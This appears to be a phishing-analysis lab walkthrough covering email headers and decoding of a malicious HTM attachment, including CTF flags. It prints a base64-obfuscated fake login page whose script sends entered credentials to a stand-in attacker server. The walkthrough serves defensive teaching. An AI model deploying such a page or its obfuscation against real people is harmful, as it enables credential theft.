----
Reveal how attackers can craft client-side credential-stealing webpages that evade detection by security tools.
----

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/adebd9732d92ad4a1445744edf90e2cf.png)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/8caffe2d71dbd2d73e1014d63d086ad3.png)

### Task 1  Introduction

In this room, we will look at identifying and analyzing a malicious phishing email through visual inspection, common header inspection tools, and manual deobfuscation. With these methods learned, it will become easier to identify and respond to phishing threats that impact organizations daily.

Learning Objectives

- Understand what email headers are and familiarize yourself with common headers.
- Utilize tools for inspecting and analyzing suspicious emails and attachments.
- Learn to recognize different obfuscation techniques employed in malicious HTML, CSS, and JavaScript code.

Room Prerequisites

Before continuing with this room, having some background context on phishing emails and their characteristics is recommended. The [Phishing Emails in Action](https://tryhackme.com/room/phishingemails2rytmuv) room is an excellent starting point to familiarize yourself with the topic.

Answer the questions below

Click to continue!  

Correct Answer

### Task 2  Phishing Email Analysis

 Download Task Files

While working as a SOC Analyst for _Flying-Sec_, you receive an incoming report from senior executive Paul Feathers. Paul recently received an email from _ParrotPost_, a legitimate company email tool, asking him to log into his account to resolve an issue with his account information.

![The suspicious email Paul received in his email client.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/6a3db93c263d2f450c9d5131e95622c2.png)  

Your task is to investigate the email and determine whether it is a legitimate request or a phishing attempt. The EML file can be accessed on the AttackBox under `/root/Rooms/ParrotPost`. However, it is also attached to this task and available for download.

Answer the questions below

I am ready to proceed with the analysis!  

Correct Answer

### Task 3  Email Headers

Let's talk about analyzing email files. Emails are comprised of several components, including the header, body, and, if applicable, any attachments. The standard that emails generally follow is defined by the _Internet Engineering Task Force (IETF)_, specifically in [RFC 5322](https://datatracker.ietf.org/doc/html/rfc5322), which specifies the syntax and semantics of email messages, and the [RFC 2045-2049](https://datatracker.ietf.org/doc/html/rfc2045) series, which defines the _Multipurpose Internet Mail Extensions (MIME)_ standard for email messages on the Internet.

Email Headers

The email headers are a great place to start when manually investigating a suspicious email. Email headers contain important metadata and information such as the sender and recipient's email addresses, the date and time the email was sent, and the path the message took to reach its intended destination. Investigating email headers can provide valuable insights into an email's origin and potential security concerns.

Viewing Email Headers

The process for viewing an email's headers can vary depending on the email client or service you are using. Sometimes in the specific email's context or view menu, there will be an option to view the headers directly or to download the original message as a file. In our case, we already have a copy of the email Paul received in `.eml` format. The `.eml` file format is in plaintext, meaning it can be read and edited using a basic text editor like Notepad, TextEdit, or Sublime Text.

To investigate this email further, open up `URGENTParrotPostAccountUpdateRequired.eml` in Sublime Text. You can optionally copy the file's contents and paste it into an email headers analyzer tool, such as [MXToolbox](https://mxtoolbox.com/EmailHeaders.aspx) or [Message Header Analyzer](https://mha.azurewebsites.net/). These client-side web tools provide a more graphical view of the email headers.

Common Email Headers

You are probably used to seeing several standard email headers, as most email clients (like Gmail, Outlook, Yahoo, and others) will display these headers by default:

1. **Subject** - This provides a topic or summary of the email's content
2. **From** - This identifies the sender of the email message (this can easily be spoofed!)
3. **To** - This identifies the primary recipient(s) of the email
4. **Date** - Indicates the date and time when the email message was sent

Below, visually locate where these headers are mapped to in Paul's email client, as seen from the Outlook on the Web (OWA) app.

![Labelled diagram mapping the components the email's screenshot to common headers found in the OWA email client.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/784ae7675403e49d2f41f67a27b551c5.png)  

Most email headers will not be visible directly from an email client, so we need a text editor to view the complete email header information.

It's also important to understand that any line in an email can be forged or spoofed. However, there are some headers that you can trust more than others when conducting analysis. For example, the "Received" headers are added by each email server that processes the email, and they can offer a record of the email's path from source to destination.

Identifying the Source  

Because email headers are so easily spoofed, it can be challenging to determine the originating sender or source of an email. As mentioned earlier, the "Received" headers are added by email servers to show the path the email took. The sender's IP address is typically listed in the first "Received" header (look at the date/times!).

![Received header information for Paul's email, indicating an IP address of 109.205.120.0](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/2b448337d00799c72eceb541e8706218.png)  

Once you have identified the source IP address, you can use an IP lookup tool to find out more information about the sender, such as their ISP (Internet Service Provider) or the geographic location of their IP address. Several free tools are available online, such as [iplocation.io](https://iplocation.io/) and [iplocation.net](https://www.iplocation.net/ip-lookup).

Custom Email Headers

Email headers starting with "X-" are custom headers the sender can add. The "X-" prefix is typically used to denote that the header is not an official or standardized header defined by the IETF. These custom headers often provide additional information or metadata about the email, such as tagging the email for spam filtering or sorting purposes or adding information specific to a particular organization or system.

Answer the questions below

```
root@ip-10-10-14-173:~/Rooms/ParrotPost# subl URGENTParrotPostAccountUpdateRequired.eml


https://mxtoolbox.com/Public/Tools/EmailHeaders.aspx?huid=a53d8e12-e10a-48cd-8af4-fee867c7711f

|Header Name|Header Value|
|---|---|
|MIME-Version|1.0|
|Date|Sun, 30 Apr 2023 20:50:15 -0000|
|Message-Id|<20230430205009.69DE46124E8@emkei.lv>|
|Subject|URGENT: ParrotPost Account Update Required|
|From|Parrot Post Webmail <no-reply@postparrot.thm>|
|Return-Path|<no-reply@postparrot.thm>|
|Reply-To|Parrot Post Webmail <no-reply@postparr0t.thm>|
|To|Paul Feathers <pfeathers@flying-sec.thm>|
|X-Custom-Header|THM{y0u_f0und_7h3_h34d3r}|
|Content-Type|multipart/mixed; boundary="0000000000007bfc3205fa937852"|
|X-Priority|1 (Highest)|
|Importance|High|
|Authentication-Results|mailin005.flying-sec.thm; dmarc=none (p=none dis=none) header.from=postparrot.thm|

https://mha.azurewebsites.net/

https://iplocation.io/ip/109.205.120.0

https://www.iplocation.net/ip-lookup

#### Geolocation data from [IPGeolocation.io](https://www.iplocation.net/go/ipgeolocation) (Product: API, real-time)

![](https://www.iplocation.net/assets/img/icons/ip.png)IP ADDRESS:109.205.120.0

![](https://www.iplocation.net/assets/img/icons/country.png)COUNTRY:Latvia 

![](https://www.iplocation.net/assets/img/icons/region.png)REGION:Vidzeme

![](https://www.iplocation.net/assets/img/icons/city.png)CITY:Riga

![](https://www.iplocation.net/assets/img/icons/isp.png)ISP:SIA BITE Latvija

![](https://www.iplocation.net/assets/img/icons/organization.png)ORGANIZATION:SIA BITE Latvija

![](https://www.iplocation.net/assets/img/icons/latitude.png)LATITUDE:56.96113

![](https://www.iplocation.net/assets/img/icons/longitude.png)LONGITUDE:24.13235


```

According to the IP address, what country is the sending email server associated with?  

*Latvia*

If Paul replies to this email, which email address will his reply be sent to?

*no-reply@postparr0t.thm*

What is the value of the custom header in the email?

*THM{y0u_f0und_7h3_h34d3r}*

### Task 4  Email Attachment Analysis

 Download Task Files

As we discovered by looking at the `.eml` file in a text editor, the email Paul received contains an embedded attachment named _"ParrotPostACTIONREQUIRED.htm."_ Based on this file type and the listed **Content-Type**, this is an HTML (Hypertext Markup Language) file used to create a web page or document that can be viewed in a web browser.

![Sublime Text output indicating that this attachment's filename is set to ParrotPostACTIONREQUIRED.html with a text/html Content-Type](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/dfdd050be423941147bcc20e33f9c2c2.png)  

Some email filters or security systems may be configured to block or quarantine certain file types, such as HTML files. By using alternatives like HTM or SHTM file extensions instead of HTML, attackers may be able to bypass these filters and increase the chances of their email reaching the intended recipient. A `.htm` file is the most common alternative to HTML and is similarly used to represent web pages written in HTML code.

You may think receiving an HTML document attached to an email is inherently suspicious. While uncommon, there are valid reasons why a legitimate service may do so, such as including interactive forms or dynamic content. For example, secure mail platforms (like _Cisco Secure Email Encryption Service_) may also attach HTML documents to enhance the user experience with advanced features like encryption and authentication.

Content Transfer Encoding

In the attachment metadata section of the .eml file, "Content-Transfer-Encoding" is a header that indicates how the attachment's content is encoded. Base64 encodes binary data (such as images, audio files, or other content) into ASCII characters that can be sent via email or other text-based channels.

You will notice a large section of base64 encoded text at the end of the .eml file. This is the encoded contents of the embedded HTM file, which we can extract and manually decode, but typically attachments can be extracted through any modern email client.

The attachment has been extracted and separated from the email to simplify this task. You can find this .htm file on the AttackBox under `/root/Rooms/ParrotPost` or download the `ParrotPostACTIONREQUIRED.htm` file by clicking on **Download Task Files** at the top of this task.

Analyzing the File

Since _ParrotPostACTIONREQUIRED.htm_ is a plaintext file, we can also open this up in Sublime Text. By doing so, we uncover the markup of this webpage, which seemingly is another wall of encoded text!

_Tip: Turn on **Word Wrap** in Sublime Text under View > Word Wrap_

![SublimeText code, demonstrating that the attached HTM file has been base64 encoded.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/dafbe4dce3a476fa106c73f226bee7da.png)  

The creator of this file uses encoding to obfuscate the true nature of the webpage. Between this and the suspicious file extension, the original sender may have nefarious intentions and is actively trying to evade detection.

This HTML document declares a variable called `b64` which is set to another long string of seemingly encoded data. Aside from the telling variable name, base64-encoded data typically includes the characters A-Z, a-z, 0-9, +, /, and padding characters (=). If you see these characters in a string of text, there is a good chance it may be base64-encoded.

atob()

After declaring the encoded string, the browser will execute the following line of JavaScript:

`document.write(unescape(atob(b64)));`

To break down this nested function:

1. The `atob()` is a built-in JavaScript function to decode a base64-encoded string. This function passes in the `b64` variable that was previously declared as its input.
2. The `unescape()` function converts any escaped characters in the decoded string into their original form. This is necessary because base64-encoded strings may contain special characters that must be appropriately formatted before being displayed on a webpage.
3. The `document.write()` function displays the decoded and unescaped string on the webpage where the code is executed.

The encoded variable likely contains the actual website content rendered at runtime. Because of this, we will need to go another layer deeper and decode the variable to find out what this webpage consists of.

Base64 Decoding

There are many ways to decode base64 data, and a very common method is to use CyberChef, which is a powerful web-based application that provides tools for encoding, decoding, analyzing, and manipulating data in various formats. It can be found pre-installed on the AttackBox (navigate to `http://localhost:7777`), or it can be accessed on the Internet here: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

To uncover the contents of the b64 variable, copy the entire base64 string (everything between the opening and closing quotation marks) and paste it into the **Input** field of CyberChef. From there, we can select the **From Base64** operation on the left-hand side of the page and drag it into the **Recipe** pane.

![CyberChef dashboard, base64 decoding the string from the HTM attachment file.](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/d14814855498e788a28dcdc7663bcc98.png)  

If successful, you should see the decoded data under the **Output** pane. Copy that entire output and save it as a new HTML file named "decoded_webpage.html."

Answer the questions below

```
<html>
<head>
<script>
            var b64 = "PCFET0NUWVBFIGh0bWw+PGh0bWw+PGhlYWQ+PHRpdGxlPlBhcnJvdFBvc3QgTG9naW48L3RpdGxlPjxtZXRhIGNoYXJzZXQ9IlVURi04Ij48bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+PHN0eWxlPmJvZHl7Zm9udC1mYW1pbHk6QXJpYWwsc2Fucy1zZXJpZjt9aW5wdXRbdHlwZT1wYXNzd29yZF0saW5wdXRbdHlwZT10ZXh0XXt3aWR0aDoxMDAlO31ib2R5e2JhY2tncm91bmQtY29sb3I6I2YyZjJmMjt9aDEsW2NsYXNzfj1mb3Jnb3QtcGFzc3dvcmRde3RleHQtYWxpZ246Y2VudGVyO31mb3JtLGlucHV0W3R5cGU9cGFzc3dvcmRdLGJ1dHRvbixpbnB1dFt0eXBlPXRleHRde3BhZGRpbmctbGVmdDouMjA4MzMzMzMzaW47fWgxe21hcmdpbi10b3A6LjUyMDgzMzMzM2luO31mb3Jte2JhY2tncm91bmQtY29sb3I6I2ZmZjt9aW5wdXRbdHlwZT10ZXh0XSxpbnB1dFt0eXBlPXBhc3N3b3JkXXtwYWRkaW5nLWJvdHRvbTo5cHQ7fWZvcm0saW5wdXRbdHlwZT1wYXNzd29yZF0sYnV0dG9uLGlucHV0W3R5cGU9dGV4dF17cGFkZGluZy1yaWdodDouMjA4MzMzMzMzaW47fVtjbGFzc349Zm9yZ290LXBhc3N3b3JkXXttYXJnaW4tdG9wOjEuMjVwYzt9aW5wdXRbdHlwZT10ZXh0XSxpbnB1dFt0eXBlPXBhc3N3b3JkXXtwYWRkaW5nLXRvcDo5cHQ7fVtjbGFzc349Zm9yZ290LXBhc3N3b3JkXXtmb250LXNpemU6Ljc1cGM7fWlucHV0W3R5cGU9cGFzc3dvcmRdLGlucHV0W3R5cGU9dGV4dF17bWFyZ2luLWxlZnQ6MDt9aW5wdXRbdHlwZT1wYXNzd29yZF0saW5wdXRbdHlwZT10ZXh0XXttYXJnaW4tYm90dG9tOjZwdDt9aW5wdXRbdHlwZT10ZXh0XSxpbnB1dFt0eXBlPXBhc3N3b3JkXXttYXJnaW4tcmlnaHQ6MDt9Zm9ybXtib3JkZXItcmFkaXVzOi4zMTI1cGM7fWZvcm17Ym94LXNoYWRvdzowIDAgNy41cHQgcmdiYSgwLDAsMCwuMik7fWlucHV0W3R5cGU9dGV4dF0saW5wdXRbdHlwZT1wYXNzd29yZF17bWFyZ2luLXRvcDo2cHQ7fWlucHV0W3R5cGU9cGFzc3dvcmRdLGlucHV0W3R5cGU9dGV4dF17ZGlzcGxheTppbmxpbmUtYmxvY2s7fWlucHV0W3R5cGU9dGV4dF17Ym9yZGVyLWxlZnQtd2lkdGg6Ljc1cHQ7fWZvcm17d2lkdGg6MTguNzVwYzt9Zm9ybXttYXJnaW4tbGVmdDphdXRvO31pbnB1dFt0eXBlPXRleHRde2JvcmRlci1ib3R0b20td2lkdGg6Ljc1cHQ7fWlucHV0W3R5cGU9dGV4dF17Ym9yZGVyLXJpZ2h0LXdpZHRoOi43NXB0O31mb3Jte21hcmdpbi1ib3R0b206MzcuNXB0O31pbnB1dFt0eXBlPXRleHRde2JvcmRlci10b3Atd2lkdGg6Ljc1cHQ7fWlucHV0W3R5cGU9dGV4dF17Ym9yZGVyLWxlZnQtc3R5bGU6c29saWQ7fWlucHV0W3R5cGU9dGV4dF17Ym9yZGVyLWJvdHRvbS1zdHlsZTpzb2xpZDt9aW5wdXRbdHlwZT10ZXh0XXtib3JkZXItcmlnaHQtc3R5bGU6c29saWQ7fWlucHV0W3R5cGU9dGV4dF17Ym9yZGVyLXRvcC1zdHlsZTpzb2xpZDt9Zm9ybXttYXJnaW4tcmlnaHQ6YXV0bzt9aW5wdXRbdHlwZT10ZXh0XXtib3JkZXItbGVmdC1jb2xvcjojY2NjO31pbnB1dFt0eXBlPXRleHRde2JvcmRlci1ib3R0b20tY29sb3I6I2NjYzt9aW5wdXRbdHlwZT10ZXh0XXtib3JkZXItcmlnaHQtY29sb3I6I2NjYzt9aW5wdXRbdHlwZT10ZXh0XXtib3JkZXItdG9wLWNvbG9yOiNjY2M7fWZvcm17bWFyZ2luLXRvcDozNy41cHQ7fWlucHV0W3R5cGU9dGV4dF17Ym9yZGVyLWltYWdlOm5vbmU7fWZvcm17cGFkZGluZy1ib3R0b206MTVwdDt9aW5wdXRbdHlwZT10ZXh0XSxpbnB1dFt0eXBlPXBhc3N3b3JkXXtib3JkZXItcmFkaXVzOi4wNDE2NjY2Njdpbjt9Zm9ybXtwYWRkaW5nLXRvcDoxNXB0O31pbnB1dFt0eXBlPXBhc3N3b3JkXSxpbnB1dFt0eXBlPXRleHRde2JveC1zaXppbmc6Ym9yZGVyLWJveDt9YnV0dG9ue2JhY2tncm91bmQtY29sb3I6IzRjYWY1MDt9YnV0dG9ue2NvbG9yOiNmZmY7fWJ1dHRvbntwYWRkaW5nLWJvdHRvbToxMC41cHQ7fWJ1dHRvbntwYWRkaW5nLXRvcDoxMC41cHQ7fWJ1dHRvbnttYXJnaW4tbGVmdDowO31idXR0b257bWFyZ2luLWJvdHRvbTo2cHQ7fWJ1dHRvbnttYXJnaW4tcmlnaHQ6MDt9YnV0dG9ue21hcmdpbi10b3A6NnB0O31idXR0b257Ym9yZGVyLWxlZnQtd2lkdGg6bWVkaXVtO31idXR0b257Ym9yZGVyLWJvdHRvbS13aWR0aDptZWRpdW07fWJ1dHRvbntib3JkZXItcmlnaHQtd2lkdGg6bWVkaXVtO31pbnB1dFt0eXBlPXBhc3N3b3JkXXtib3JkZXItbGVmdC13aWR0aDouNzVwdDt9aW5wdXRbdHlwZT1wYXNzd29yZF17Ym9yZGVyLWJvdHRvbS13aWR0aDouNzVwdDt9aW5wdXRbdHlwZT1wYXNzd29yZF17Ym9yZGVyLXJpZ2h0LXdpZHRoOi43NXB0O31pbnB1dFt0eXBlPXBhc3N3b3JkXXtib3JkZXItdG9wLXdpZHRoOi43NXB0O31pbnB1dFt0eXBlPXBhc3N3b3JkXXtib3JkZXItbGVmdC1zdHlsZTpzb2xpZDt9YnV0dG9ue2JvcmRlci10b3Atd2lkdGg6bWVkaXVtO31pbnB1dFt0eXBlPXBhc3N3b3JkXXtib3JkZXItYm90dG9tLXN0eWxlOnNvbGlkO31idXR0b257Ym9yZGVyLWxlZnQtc3R5bGU6bm9uZTt9aW5wdXRbdHlwZT1wYXNzd29yZF17Ym9yZGVyLXJpZ2h0LXN0eWxlOnNvbGlkO31pbnB1dFt0eXBlPXBhc3N3b3JkXXtib3JkZXItdG9wLXN0eWxlOnNvbGlkO31pbnB1dFt0eXBlPXBhc3N3b3JkXXtib3JkZXItbGVmdC1jb2xvcjojY2NjO31pbnB1dFt0eXBlPXBhc3N3b3JkXXtib3JkZXItYm90dG9tLWNvbG9yOiNjY2M7fWlucHV0W3R5cGU9cGFzc3dvcmRde2JvcmRlci1yaWdodC1jb2xvcjojY2NjO31pbnB1dFt0eXBlPXBhc3N3b3JkXXtib3JkZXItdG9wLWNvbG9yOiNjY2M7fWJ1dHRvbntib3JkZXItYm90dG9tLXN0eWxlOm5vbmU7fWJ1dHRvbntib3JkZXItcmlnaHQtc3R5bGU6bm9uZTt9YnV0dG9ue2JvcmRlci10b3Atc3R5bGU6bm9uZTt9aW5wdXRbdHlwZT1wYXNzd29yZF17Ym9yZGVyLWltYWdlOm5vbmU7fWJ1dHRvbjpob3ZlcntiYWNrZ3JvdW5kLWNvbG9yOiM0NWEwNDk7fWJ1dHRvbntib3JkZXItbGVmdC1jb2xvcjpjdXJyZW50Q29sb3I7fWJ1dHRvbntib3JkZXItYm90dG9tLWNvbG9yOmN1cnJlbnRDb2xvcjt9bGFiZWxbY2xhc3N+PWNoZWNrYm94XXtkaXNwbGF5OmlubGluZS1ibG9jazt9YnV0dG9ue2JvcmRlci1yaWdodC1jb2xvcjpjdXJyZW50Q29sb3I7fWxhYmVsW2NsYXNzfj1jaGVja2JveF17bWFyZ2luLWJvdHRvbTouNzVwYzt9YnV0dG9ue2JvcmRlci10b3AtY29sb3I6Y3VycmVudENvbG9yO31idXR0b257Ym9yZGVyLWltYWdlOm5vbmU7fWJ1dHRvbntib3JkZXItcmFkaXVzOjNwdDt9YnV0dG9ue2N1cnNvcjpwb2ludGVyO31idXR0b257d2lkdGg6MTAwJTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPiYjODA7JiM5NzsmIzExNDsmIzExNDsmIzExMTsmIzExNjsmIzgwOyYjMTExOyYjMTE1OyYjMTE2OyYjMzI7JiM4MzsmIzEwMTsmIzk5OyYjMTE3OyYjMTE0OyYjMTAxOyYjMzI7JiM4NzsmIzEwMTsmIzk4OyYjMTA5OyYjOTc7JiMxMDU7JiMxMDg7JiMzMjsmIzc2OyYjMTExOyYjMTAzOyYjMTA1OyYjMTEwOzwvaDE+PGZvcm0gaWQ9IiYjMTA4OyYjMTExOyYjMTAzOyYjMTA1OyYjMTEwOyYjNDU7JiMxMDI7JiMxMTE7JiMxMTQ7JiMxMDk7Ij48bGFiZWwgZm9yPSImIzEwMTsmIzEwOTsmIzk3OyYjMTA1OyYjMTA4OyI+JiM2OTsmIzEwOTsmIzk3OyYjMTA1OyYjMTA4OyYjNTg7PC9sYWJlbD48aW5wdXQgdHlwZT0iJiMxMTY7JiMxMDE7JiMxMjA7JiMxMTY7IiBpZD0iJiMxMDE7JiMxMDk7JiM5NzsmIzEwNTsmIzEwODsiIG5hbWU9IiYjMTAxOyYjMTA5OyYjOTc7JiMxMDU7JiMxMDg7IiB2YWx1ZT0iJiMxMTI7JiMxMDI7JiMxMDE7JiM5NzsmIzExNjsmIzEwNDsmIzEwMTsmIzExNDsmIzExNTsmIzY0OyYjMTAyOyYjMTA4OyYjMTIxOyYjMTA1OyYjMTEwOyYjMTAzOyYjNDU7JiMxMTU7JiMxMDE7JiM5OTsmIzQ2OyYjMTE2OyYjMTA0OyYjMTA5OyIgcGxhY2Vob2xkZXI9IiYjNjk7JiMxMTA7JiMxMTY7JiMxMDE7JiMxMTQ7JiMzMjsmIzEyMTsmIzExMTsmIzExNzsmIzExNDsmIzMyOyYjMTAxOyYjMTA5OyYjOTc7JiMxMDU7JiMxMDg7JiMzMjsmIzk3OyYjMTAwOyYjMTAwOyYjMTE0OyYjMTAxOyYjMTE1OyYjMTE1OyI+PGxhYmVsIGZvcj0iJiMxMTI7JiM5NzsmIzExNTsmIzExNTsmIzExOTsmIzExMTsmIzExNDsmIzEwMDsiPiYjODA7JiM5NzsmIzExNTsmIzExNTsmIzExOTsmIzExMTsmIzExNDsmIzEwMDsmIzU4OzwvbGFiZWw+PGlucHV0IHR5cGU9IiYjMTEyOyYjOTc7JiMxMTU7JiMxMTU7JiMxMTk7JiMxMTE7JiMxMTQ7JiMxMDA7IiBpZD0iJiMxMTI7JiM5NzsmIzExNTsmIzExNTsmIzExOTsmIzExMTsmIzExNDsmIzEwMDsiIG5hbWU9IiYjMTEyOyYjOTc7JiMxMTU7JiMxMTU7JiMxMTk7JiMxMTE7JiMxMTQ7JiMxMDA7IiBwbGFjZWhvbGRlcj0iJiM2OTsmIzExMDsmIzExNjsmIzEwMTsmIzExNDsmIzMyOyYjMTIxOyYjMTExOyYjMTE3OyYjMTE0OyYjMzI7JiMxMTI7JiM5NzsmIzExNTsmIzExNTsmIzExOTsmIzExMTsmIzExNDsmIzEwMDsiPjxidXR0b24gdHlwZT0iJiMxMTU7JiMxMTc7JiM5ODsmIzEwOTsmIzEwNTsmIzExNjsiIGlkPSImIzEwODsmIzExMTsmIzEwMzsmIzEwNTsmIzExMDsmIzQ1OyYjOTg7JiMxMTc7JiMxMTY7JiMxMTY7JiMxMTE7JiMxMTA7Ij4mIzc2OyYjMTExOyYjMTAzOyYjMTA1OyYjMTEwOzwvYnV0dG9uPjxkaXYgY2xhc3M9IiYjMTAyOyYjMTExOyYjMTE0OyYjMTAzOyYjMTExOyYjMTE2OyYjNDU7JiMxMTI7JiM5NzsmIzExNTsmIzExNTsmIzExOTsmIzExMTsmIzExNDsmIzEwMDsiPjxhIGhyZWY9IiYjMzU7Ij4mIzcwOyYjMTExOyYjMTE0OyYjMTAzOyYjMTExOyYjMTE2OyYjMzI7JiM4MDsmIzk3OyYjMTE1OyYjMTE1OyYjMTE5OyYjMTExOyYjMTE0OyYjMTAwOyYjNjM7PC9hPjwvZGl2PjwhLS0gVkVoTmUyUXdkV0pzTTE4emJtTXdaRE5rZlFvPSAtLT48L2Zvcm0+PHNjcmlwdD5jb25zdCBmb3JtPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbi1mb3JtIik7Y29uc3QgbG9naW5CdXR0b249ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImxvZ2luLWJ1dHRvbiIpO2xldCBlcnJvck1lc3NhZ2U9bnVsbDtmb3JtLmFkZEV2ZW50TGlzdGVuZXIoInN1Ym1pdCIsKGV2ZW50KT0+ey8qcHJldmVudCB0aGUgZm9ybSBmcm9tIHN1Ym1pdHRpbmcgbm9ybWFsbHkqL2V2ZW50LnByZXZlbnREZWZhdWx0KCk7LypnZXQgdGhlIHVzZXJuYW1lIGFuZCBwYXNzd29yZCBpbnB1dCB2YWx1ZXMgYW5kIHNldCB0aGVtIHRvIHZhcmlhYmxlcyovY29uc3QgZW1haWw9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImVtYWlsIikudmFsdWU7Y29uc3QgcGFzc3dvcmQ9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInBhc3N3b3JkIikudmFsdWU7LypjcmVhdGUgYSBuZXcgSFRUUCByZXF1ZXN0IG9iamVjdCBmb3Igb3VyIGV2aWwgc2VydmVyKi9jb25zdCB4aHI9bmV3IFhNTEh0dHBSZXF1ZXN0KCk7LyplbmNvZGUgdGhlIGVtYWlsIGFuZCBwYXNzd29yZCB1c2luZyBlbmNvZGVVUklDb21wb25lbnQqL2NvbnN0IGVuY29kZWRFbWFpbD1lbmNvZGVVUklDb21wb25lbnQoZW1haWwpO2NvbnN0IGVuY29kZWRQYXNzd29yZD1lbmNvZGVVUklDb21wb25lbnQocGFzc3dvcmQpOy8qYWRkIHRoZSBlbmNvZGVkIGVtYWlsIGFuZCBwYXNzd29yZCBhcyBxdWVyeSBwYXJhbWV0ZXJzIGluIHRoZSBHRVQgcmVxdWVzdCovY29uc3QgdXJsPWBodHRwOi8vZXZpbHBhcnJvdC50aG06ODA4MC9jcmVkLWNhcHR1cmUucGhwP2VtYWlsPSR7ZW5jb2RlZEVtYWlsfSZwYXNzd29yZD0ke2VuY29kZWRQYXNzd29yZH1gO3hoci5vcGVuKCJHRVQiLHVybCx0cnVlKTsvKnNlbmQgdGhlIEdFVCByZXF1ZXN0IHRvIHRoZSBldmlsIHNlcnZlcioveGhyLnNlbmQoKTtpZihlcnJvck1lc3NhZ2Upe2Vycm9yTWVzc2FnZS5pbm5lckhUTUw9IlNvcnJ5LCB0aGVyZSB3YXMgYW4gZXJyb3IgcHJvY2Vzc2luZyB5b3VyIHJlcXVlc3QuIFBsZWFzZSB0cnkgYWdhaW4gbGF0ZXIuIjt9ZWxzZXtlcnJvck1lc3NhZ2U9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7ZXJyb3JNZXNzYWdlLmlubmVySFRNTD0iU29ycnksIHRoZXJlIHdhcyBhbiBlcnJvciBwcm9jZXNzaW5nIHlvdXIgcmVxdWVzdC4gUGxlYXNlIHRyeSBhZ2FpbiBsYXRlci4iO2Vycm9yTWVzc2FnZS5zdHlsZS5jb2xvcj0icmVkIjtldmFsKGZ1bmN0aW9uKHAsYSxjLGssZSxkKXtlPWZ1bmN0aW9uKGMpe3JldHVybiBjfTtpZighJycucmVwbGFjZSgvXi8sU3RyaW5nKSl7d2hpbGUoYy0tKXtkW2NdPWtbY118fGN9az1bZnVuY3Rpb24oZSl7cmV0dXJuIGRbZV19XTtlPWZ1bmN0aW9uKCl7cmV0dXJuJ1xcdysnfTtjPTF9O3doaWxlKGMtLSl7aWYoa1tjXSl7cD1wLnJlcGxhY2UobmV3IFJlZ0V4cCgnXFxiJytlKGMpKydcXGInLCdnJyksa1tjXSl9fXJldHVybiBwfSgnMy4yLjE9IjAiOycsNCw0LCcxMnB4fGZvbnRTaXplfHN0eWxlfGVycm9yTWVzc2FnZScuc3BsaXQoJ3wnKSwwLHt9KSkKZm9ybS5pbnNlcnRCZWZvcmUoZXJyb3JNZXNzYWdlLGxvZ2luQnV0dG9uLm5leHRTaWJsaW5nKTt9fSk7LypyZWRpcmVjdCB0byB0aGUgUkVBTCBQb3N0UGFycm90IHdlYnNpdGUgYWZ0ZXIgc2VuZGluZywgc28gdGhlIHZpY3RpbSBkb2Vzbid0IGdldCBzdXNwaWNpb3VzISAvL3dpbmRvdy5sb2NhdGlvbi5ocmVmID0gImh0dHBzOi8vd3d3LnBvc3RwYXJyb3QudGhtIjsqLzwvc2NyaXB0PjwvYm9keT48L2h0bWw+";
            document.write(unescape(atob(b64)));
        </script>
</head>
</html>

decoded.html

<!DOCTYPE html><html><head><title>ParrotPost Login</title><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>body{font-family:Arial,sans-serif;}input[type=password],input[type=text]{width:100%;}body{background-color:#f2f2f2;}h1,[class~=forgot-password]{text-align:center;}form,input[type=password],button,input[type=text]{padding-left:.208333333in;}h1{margin-top:.520833333in;}form{background-color:#fff;}input[type=text],input[type=password]{padding-bottom:9pt;}form,input[type=password],button,input[type=text]{padding-right:.208333333in;}[class~=forgot-password]{margin-top:1.25pc;}input[type=text],input[type=password]{padding-top:9pt;}[class~=forgot-password]{font-size:.75pc;}input[type=password],input[type=text]{margin-left:0;}input[type=password],input[type=text]{margin-bottom:6pt;}input[type=text],input[type=password]{margin-right:0;}form{border-radius:.3125pc;}form{box-shadow:0 0 7.5pt rgba(0,0,0,.2);}input[type=text],input[type=password]{margin-top:6pt;}input[type=password],input[type=text]{display:inline-block;}input[type=text]{border-left-width:.75pt;}form{width:18.75pc;}form{margin-left:auto;}input[type=text]{border-bottom-width:.75pt;}input[type=text]{border-right-width:.75pt;}form{margin-bottom:37.5pt;}input[type=text]{border-top-width:.75pt;}input[type=text]{border-left-style:solid;}input[type=text]{border-bottom-style:solid;}input[type=text]{border-right-style:solid;}input[type=text]{border-top-style:solid;}form{margin-right:auto;}input[type=text]{border-left-color:#ccc;}input[type=text]{border-bottom-color:#ccc;}input[type=text]{border-right-color:#ccc;}input[type=text]{border-top-color:#ccc;}form{margin-top:37.5pt;}input[type=text]{border-image:none;}form{padding-bottom:15pt;}input[type=text],input[type=password]{border-radius:.041666667in;}form{padding-top:15pt;}input[type=password],input[type=text]{box-sizing:border-box;}button{background-color:#4caf50;}button{color:#fff;}button{padding-bottom:10.5pt;}button{padding-top:10.5pt;}button{margin-left:0;}button{margin-bottom:6pt;}button{margin-right:0;}button{margin-top:6pt;}button{border-left-width:medium;}button{border-bottom-width:medium;}button{border-right-width:medium;}input[type=password]{border-left-width:.75pt;}input[type=password]{border-bottom-width:.75pt;}input[type=password]{border-right-width:.75pt;}input[type=password]{border-top-width:.75pt;}input[type=password]{border-left-style:soli